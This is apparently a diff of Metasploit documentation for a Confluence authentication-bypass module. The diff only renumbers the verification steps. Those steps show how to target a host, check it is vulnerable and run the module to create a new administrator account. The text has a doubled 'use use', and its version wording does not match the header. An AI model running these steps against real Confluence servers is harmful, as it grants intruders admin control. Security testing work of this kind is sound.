@@ -8,17 +8,17 @@ Affecting Atlassian Confluence from version 8.0.0 to before 8.3.3, from version 
 
 ## Verification Steps
 
-- [ ] Setting up a working installation of Atlassian Confluence Server before 8.0.0
-- [ ] Start `msfconsole`
-- [ ] `use use auxiliary/admin/http/atlassian_confluence_auth_bypass`
-- [ ] `set RHOST <IP>`
-- [ ] `set RPORT <PORT>`
-- [ ] `check`
-- [ ] You should see `The target is vulnerable`
-- [ ] `set NEW_USERNAME <username>`
-- [ ] `set NEW_PASSWORD <password>`
-- [ ] `run`
-- [ ] You should get a new admin account. 
+1. Setting up a working installation of Atlassian Confluence Server before 8.0.0
+2. Start `msfconsole`
+3. `use use auxiliary/admin/http/atlassian_confluence_auth_bypass`
+4. `set RHOST <IP>`
+5. `set RPORT <PORT>`
+6. `check`
+7. You should see `The target is vulnerable`
+8. `set NEW_USERNAME <username>`
+9. `set NEW_PASSWORD <password>`
+10. `run`
+11. You should get a new admin account. 
 
 ## Options
 - **TARGETURI**: Path to Atlassian Confluence installation ("/" is the default)
